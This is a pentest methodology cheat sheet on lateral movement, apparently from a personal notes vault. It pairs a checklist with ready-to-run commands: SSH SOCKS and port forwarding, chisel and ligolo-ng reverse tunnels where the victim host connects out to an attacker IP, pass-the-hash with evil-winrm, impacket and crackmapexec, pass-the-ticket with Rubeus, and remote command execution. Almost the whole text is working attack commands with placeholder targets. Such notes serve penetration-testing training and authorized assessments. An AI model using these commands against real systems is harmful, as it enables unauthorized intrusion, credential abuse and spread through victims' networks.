---
title: "04 — Lateral Movement"
date: 2025-01-01
categories:
  - Tools & Methodologies
  - Methodology
tags: [Methodology, Lateral Movement, Pivoting, ligolo-ng, chisel, Pass-the-Hash, SSH Tunneling]
description: "Lateral movement methodology — SSH tunneling, chisel, ligolo-ng, pass-the-hash, pass-the-ticket, remote execution techniques."
---

> 📁 **Source:** [github.com/sireton/pentest-vault/04-Lateral-Movement](https://github.com/sireton/pentest-vault)  
> ← [Back to Methodology Index](/posts/methodology-index/)

---

#lateral-movement #pivoting #phase

## Checklist
- [ ] Map network from compromised host
- [ ] Identify reachable subnets
- [ ] Establish tunnel/pivot
- [ ] Enumerate new hosts through pivot
- [ ] Pass credentials to move laterally
- [ ] Repeat post-exploitation on new hosts

---

## Pivoting & Tunneling

### SSH Tunneling
```bash
# Dynamic SOCKS proxy
ssh -D 1080 user@<pivot>
# Then: proxychains nmap <internal_IP>

# Local port forward
ssh -L <localport>:<target>:<targetport> user@<pivot>
```

### Chisel
```bash
# Attacker (server)
./chisel server -p 8080 --reverse

# Victim (client)
./chisel client <attacker_IP>:8080 R:socks

# Then: proxychains nmap -sT -p 22,80,445 <internal_IP>
```

### Ligolo-ng (Best Option)
```bash
# Attacker
./proxy -selfcert

# Victim
./agent -connect <attacker_IP>:11601 -ignore-cert

# In ligolo console: session → start
# Add route:
sudo ip route add 172.16.5.0/24 dev ligolo
```

---

## Pass-the-Hash (PtH)
```bash
evil-winrm -i <IP> -u Administrator -H <NTLMhash>
impacket-psexec -hashes :<NTLMhash> administrator@<IP>
crackmapexec smb <IP/range> -u administrator -H <NTLMhash>
```

## Pass-the-Ticket (PtT)
```powershell
.\Rubeus.exe ptt /ticket:<base64_ticket>
klist   # Verify
```

## Remote Execution
```bash
impacket-wmiexec domain/user:pass@<IP>
impacket-psexec domain/user:pass@<IP>
crackmapexec smb <IP> -u user -p pass -x "whoami"
crackmapexec smb <IP> -u user -p pass -X "Get-Process"
```

---
*See also: [[05-Active-Directory/AD Index]] | [[03-Post-Exploitation/Post-Exploitation Index]] | [[00-Meta/File Transfer Methods]]*


---

*Previous: [Methodology Post Exploitation](/posts/methodology-post-exploitation/) · Next: [Methodology Active Directory](/posts/methodology-active-directory/)*
